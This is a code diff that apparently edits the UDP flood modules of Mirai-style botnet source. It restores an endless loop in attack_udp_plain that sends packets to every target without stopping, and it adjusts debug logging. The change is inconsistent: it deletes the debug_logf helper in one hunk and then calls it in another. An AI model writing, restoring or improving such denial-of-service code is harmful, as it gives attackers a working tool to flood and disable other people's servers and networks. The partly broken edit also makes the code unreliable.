@@ -27,24 +27,6 @@
 
 static ipv4_t get_dns_resolver(void);
 
-#ifdef DEBUG
-static void debug_logf(const char *fmt, ...)
-{
-    char buf[1024];
-    int fd;
-    va_list ap;
-    va_start(ap, fmt);
-    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
-    va_end(ap);
-    if (n < 0) return;
-    fd = open("/tmp/bot_debug.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
-    if (fd >= 0)
-    {
-        write(fd, buf, (size_t)((n < (int)sizeof(buf)) ? n : (int)sizeof(buf)));
-        close(fd);
-    }
-}
-#endif
 
 void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
@@ -182,10 +164,6 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
             }
 #endif
         }
-#ifdef DEBUG
-            if (errno != 0)
-                printf("errno = %d\n", errno);
-#endif
     }
 }
 
@@ -519,10 +497,45 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
         }
     }
 
-// Debug logging removed to prevent test attack messages
+#ifdef DEBUG
+    debug_logf("UDP_PLAIN: Starting main attack loop\n");
+    int packet_count = 0;
+#endif
 
-    // Remove hardcoded test attack - this function should only be called by CNC commands
-    // The test attack code has been removed to prevent unauthorized test attacks
+    // Main attack loop
+    while (TRUE)
+    {
+        for (i = 0; i < targs_len; i++)
+        {
+            char *data;
+            int sent;
+
+            // Prepare packet data
+            if (data_rand)
+                rand_str(pkts[i], data_len);
+            else
+                memset(pkts[i], 0, data_len);
+
+            // Send the packet
+            sent = send(fds[i], pkts[i], data_len, MSG_NOSIGNAL);
+            
+#ifdef DEBUG
+            packet_count++;
+            if (packet_count % 1000 == 0) {
+                debug_logf("UDP_PLAIN: Sent %d packets so far\n", packet_count);
+            }
+            if (packet_count <= 10) {
+                debug_logf("UDP_PLAIN: Sending packet %d to target[%d] (size=%d)\n", 
+                           packet_count, i, data_len);
+            }
+            if (sent == -1) {
+                debug_logf("UDP_PLAIN: ERROR: send failed (errno=%d)\n", errno);
+            } else if (packet_count <= 10) {
+                debug_logf("UDP_PLAIN: Successfully sent %d bytes\n", sent);
+            }
+#endif
+        }
+    }
 }
 
 static ipv4_t get_dns_resolver(void)
